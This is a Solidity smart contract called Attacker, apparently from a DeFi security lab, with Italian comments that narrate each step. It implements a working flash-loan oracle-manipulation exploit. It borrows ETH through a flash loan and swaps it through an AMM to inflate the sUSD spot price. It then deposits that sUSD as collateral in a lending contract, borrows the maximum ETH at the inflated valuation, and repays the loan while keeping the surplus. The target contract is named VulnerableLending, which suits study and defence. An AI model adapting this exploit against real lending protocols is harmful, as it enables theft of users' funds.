// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IFlashBorrower} from "./IFlashBorrower.sol";
import {FlashLender} from "./FlashLender.sol";
import {SimpleAMM} from "./SimpleAMM.sol";
import {VulnerableLending} from "./VulnerableLending.sol";

contract Attacker is IFlashBorrower {
    FlashLender public immutable flashLender;
    SimpleAMM public immutable amm;
    VulnerableLending public immutable lending;
    IERC20 public immutable eth;
    IERC20 public immutable susd;

    constructor(
        FlashLender _flashLender,
        SimpleAMM _amm,
        VulnerableLending _lending,
        IERC20 _eth,
        IERC20 _susd
    ) {
        flashLender = _flashLender;
        amm = _amm;
        lending = _lending;
        eth = _eth;
        susd = _susd;
    }

    // Avvia l'attacco chiedendo `flashAmount` ETH in prestito flash
    function attack(uint256 flashAmount) external {
        flashLender.flashLoan(flashAmount);
        // al ritorno, il profitto in ETH e' rimasto su questo contratto
    }

    function executeOperation(uint256 amount) external override {
        // 1. PUMP: immetto tutto l'ETH del flash loan nell'AMM -> ricevo sUSD,
        // e il prezzo spot di sUSD schizza in alto
        eth.approve(address(amm), amount);
        uint256 susdOut = amm.swap(address(eth), amount);

        // 2. DEPOSIT: deposito quel sUSD come collaterale nel lending
        susd.approve(address(lending), susdOut);
        lending.deposit(susdOut);

        // 3. BORROW: il lending valuta il collaterale al prezzo GONFIATO ->
        //    mi lascia prendere in prestito piu' ETH del dovuto
        uint256 borrowable = lending.maxBorrow(address(this));
        lending.borrow(borrowable);

        // 4. REPAY: ripago il flash loan; l'ETH in eccesso resta il mio profitto
        eth.transfer(address(flashLender), amount);
    }
}